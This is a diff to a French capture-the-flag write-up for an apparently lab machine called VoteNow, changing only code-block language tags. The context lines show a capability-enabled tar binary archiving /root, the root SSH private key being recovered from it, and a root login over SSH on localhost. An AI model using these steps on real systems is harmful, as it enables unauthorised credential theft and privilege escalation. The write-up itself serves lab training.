@@ -316,7 +316,7 @@ Merci j'avais pigé ! :p
 
 On peut donc utiliser la capability pour lire ce que l'on souhaite sur le système mais pas écrire malheureusement. On va archiver ce qui est dans le dossier de *root* :  
 
-```bash
+```console
 tarS cz /root > root.tar.gz
 ```
 
@@ -332,7 +332,7 @@ root/.ssh/authorized_keys
 
 Aucun mot de passe n'étant attaché à la clé privée on peut donc se connecter :  
 
-```
+```console
 [admin@votenow ~]$ ssh -p 2082 -i root/.ssh/id_rsa root@127.0.0.1
 Last login: Sun Jun 28 00:42:56 2020 from 192.168.56.1
 [root@votenow ~]# id
